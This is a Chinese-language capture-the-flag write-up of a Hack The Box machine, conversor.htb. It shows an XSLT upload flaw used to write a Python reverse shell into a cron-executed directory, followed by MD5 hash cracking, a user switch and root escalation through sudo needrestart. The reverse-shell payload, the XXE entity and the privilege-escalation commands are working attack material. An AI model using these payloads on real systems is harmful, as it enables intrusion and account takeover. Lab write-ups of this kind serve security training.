---
title: HTB-Inject Writeup
date: 2026-01-20T19:40:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - XSLT
---
> 本文章以 kali 地址为 10.10.16.35 做演示

## 初始侦察

### nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.187.74
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 08:17 EST
Nmap scan report for 10.129.187.74
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds
```

开放了两个 TCP 端口 22 和 80。

### nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p22,80 10.129.187.74                                    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 08:17 EST
Nmap scan report for 10.129.187.74
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
```

发现可能存在的域名 `conversor.htb`，加入 `/etc/hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo bash -c 'echo "10.129.187.74 conversor.htb" >> /etc/hosts'

┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.187.74 conversor.htb
```
### nmap 漏洞脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=vuln -p22,80 10.129.187.74                                    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 08:18 EST
Nmap scan report for 10.129.187.74
Host is up (2.2s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 35.84 seconds
```

没有过多的发现，访问 web 80 端口。

## Web 渗透

80 端口是一个登入界面。

![](Pasted%20image%2020260122212811.png)

使用 sql 万能密码与常规弱密码并不能登入。

底部有 Register 按钮，注册一个账号尝试登入。

![](Pasted%20image%2020260122213009.png)

使用注册的账号登入访问到首页。

![](Pasted%20image%2020260122212944.png)

发现可以上传 XML、XSLT 文件。

可能存在 XSLT 漏洞，创建一个 XML 和 XSLT 文件检验一下。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.35"> ]>
<root>
    <data>&xxe;</data>
</root>
```

- `<?xml version="1.0" encoding="UTF-8"?>` 是一个标准的 XML 文件头，声明 XML 版本为 1.0，字符编码为 UTF-8
- `<! DOCTYPE foo [...]>` 定义一个名为 xxe 的外部实体
- `<root> <data>&xxe;</data> </root>` 中 `<root>` 和 `<data>` 是 XML 元素
- `&xxe` 引用前面定义的外部实体

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
    Version: <xsl:value-of select="system-property('xsl:version')"/><br/>
    Vendor: <xsl:value-of select="system-property('xsl:vendor')"/><br/>
    Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/><br/>
</xsl:template>
</xsl:stylesheet>
```

- `<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">` 是标准的 XML 声明
	1. `<xsl:stylesheet>` 定义这是一个 xslt 样式表文档
	2. `xmlns:xsl` 声明 XSLT 命名空间
	3. `xsl:` 前缀用于所有 XSLT 指令
- `<xsl:template match="/">` 定义一个模板，匹配 XML 文档的根节点 `/`
- `Version、Vendor` 获取系统属性

当系统运行这个 xslt 文件时返回类似如下内容则证明存在漏洞。

```bash
Version: 1.0
Vendor: libxslt
Vendor URL: http://xmlsoft.org/XSLT/
```

上传这两个文件得到一个目录。

![](Pasted%20image%2020260122215816.png)

访问这个目录发现 xslt 运行成功，证明漏洞存在。

![](Pasted%20image%2020260122215858.png)

创造第二个 xslt 文件。

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
    
<xsl:template match="/">
    <exsl:document href="/tmp/test.txt" method="text">
Test content written successfully
    </exsl:document>
    <html>
        <body>
                <h1>Enil Malus</h1>
        </body>
    </html>
</xsl:template>
</xsl:stylesheet>

```

- `xmlns:exsl` 引入 EXSLT 通用模块命名空间
- `exsl:document` 创建额外的输出文档
- `href="/tmp/test.txt"` 指定要写入的文件路径
- `method="text"` 指定输出格式为 text

上传后得到回显，可以写入文件。

![](Pasted%20image%2020260122220930.png)


网站上有程序的源代码，下载下来进行审计。

![](Pasted%20image%2020260122222323.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tar -xvf source_code.tar.gz

app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/

┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls
app.py  app.wsgi  install.md  instance  scripts  source_code.tar.gz  static  templates  uploads  xslt
```

发现程序每分钟会自动运行 `/var/www/conversor.htb/scripts` 下的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat install.md 
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

创造一个 python 反弹 shell。

```bash
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
    
<xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.35",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
    </exsl:document>
    Shell deployed
</xsl:template>
</xsl:stylesheet>
```

运行的同时在 kali 建立监听，稍作等待，得到反弹 shell。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo rlwrap -cAr nc -lvnp 4444        
listening on [any] 4444 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.187.74] 44936
bash: cannot set terminal process group (2996): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$
```

在刚刚进行源码审计的时候还有一个有意思的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls instance 
users.db

┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat instance/users.db 
70?tablefilesfilesCREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    ))=indexsqlite_autoindex_users_1users
```

查看靶机中具有 `bash` 环境的用户。

```bash
www-data@conversor:~$ cat /etc/passwd | grep 'bash'
cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
```

查看靶机环境中的 `users.db`。

```bash
www-data@conversor:~/conversor.htb/instance$ cat users.db
cat users.db
70?tablefilesfilesCREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
zV(MEnile41555b54d0dd8788d9b001f91972e40.!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
!nil    usersthack

`X\

 d
R
 U_b502a735-a286-49b8-ab54-d63de82e8859b502a735-a286-49b8-ab54-d63de82e8859.htmlR
U_e51cf4a7-7363-46d4-83ef-a6f1cf0bfd56e51cf4a7-7363-46d4-83ef-a6f1cf0bfd56.htmlR
                                                                                U_cb8bb27b-ce81-4b11-88f4-09abfd405738cb8bb27b-ce81-4b11-88f4-09abfd405738.htmlU_1363be8b-c6c8-4227-92cc-1367b434fb141363be8b-c6c8-4227-92cc-1367b434fb14.htmlRU_c3f1ec9b-1b2c-49d2-96a6-33aff7028391c3f1ec9b-1b2c-49d2-96a6-33aff7028391.htmlRU_f06dc183-e13f-4f4c-8389-7e414d7fe573f06dc183-e13f-4f4c-8389-7e414d7fe573.htmlRU_0facc6c2-7625-4240-9dd0-d1085335224c0facc6c2-7625-4240-9dd0-d1085335224c.htmlRU_00508ffa-82dd-4c42-9867-7dd4a6b1660500508ffa-82dd-4c42-9867-7dd4a6b16605.htmlRU_89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.htmlRU_a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.htmlRU_8374be69-0931-4445-8f58-5589d27ec7d78374be69-0931-4445-8f58-5589d27ec7d7.html

>]4>g
     (Ub502a735-a286-49b8-ab54-d63de82e8859
                                           (Ue51cf4a7-7363-46d4-83ef-a6f1cf0bfd56
(Ucb8bb27b-ce81-4b11-88f4-09abfd405738
                                      (U1363be8b-c6c8-4227-92cc-1367b434fb1(Uc3f1ec9b-1b2c-49d2-96a6-33aff7028391(Uf06dc183-e13f-4f4c-8389-7e414d7fe573(U0facc6c2-7625-4240-9dd0-d1085335224c(U00508ffa-82dd-4c42-(Ucb8bb27b-ce81-4b11-88f4-09abfd405738
                                      (U1363be8b-c6c8-4227-92cc-1367b434fb1(Uc3f1ec9b-1b2c-49d2-96a6-33aff7028391(Uf06dc183-e13f-4f4c-8389-7e414d7fe573(U0facc6c2-7625-4240-9dd0-d1085335224c(U00508ffa-82dd-4c42-9867-7dd4a6b16605(U89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b(Ua10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2'U 8374be69-0931-4445-8f58-5589d27ec7d7
```

发现一个有意思的数据 `fismathack5b5c3ac3a1c897c94caad48e6c71fdec`，很像用户 `fismathack` 的账户，将密码保存下来进行破解。

```bash
┌──(kali㉿kali)-[~/Work/Kali]    
└─$ vim hash.txt                                                                  

┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat hash.txt                                                                                         
5b5c3ac3a1c897c94caad48e6c71fdec

┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
Time.Started.....: Thu Jan 22 09:44:49 2026 (2 secs)
Time.Estimated...: Thu Jan 22 09:44:51 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4424.4 kH/s (0.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10977280/14344385 (76.53%)
Rejected.........: 0/10977280 (0.00%)
Restore.Point....: 10969088/14344385 (76.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: KillerG-18 -> Karamba
Hardware.Mon.#1..: Util: 32%

Started: Thu Jan 22 09:44:48 2026
Stopped: Thu Jan 22 09:44:53 2026
```

`fismathack` 的密码是 `Keepmesafeandwarm`，尝试切换用户。

```bash
www-data@conversor:~/conversor.htb/instance$ su fismathack
su fismathack
Password: Keepmesafeandwarm
whoami
fismathack
script -qc /bin/bash /dev/null
fismathack@conversor:/var/www/conversor.htb/instance$ whoami
whoami
fismathack
```

枚举 `sudo -l`。

```bash
fismathack@conversor:/var/www/conversor.htb/instance$ sudo -l
                                                      sudo -l
sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

不用密码就可以以 sudo 权限运行 /usr/sbin/needrestart，运行查看回显。

```bash
fismathack@conversor:/var/www/conversor.htb/instance$ sudo /usr/sbin/needrestart
Scanning processes...                                                           
Scanning linux images...                                                        

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

搜索一下相关程序。

![](Pasted%20image%2020260122225124.png)

![](Pasted%20image%2020260122225558.png)

尝试一下这个利用。

```bash
fismathack@conversor:/tmp$ mv enil.cof enil.conf
mv enil.cof enil.conf
fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c /tmp/enil.conf
sudo /usr/sbin/needrestart -c /tmp/enil.conf
root@conversor:/tmp# whoami
whoami
root
```

获得靶机 root 权限。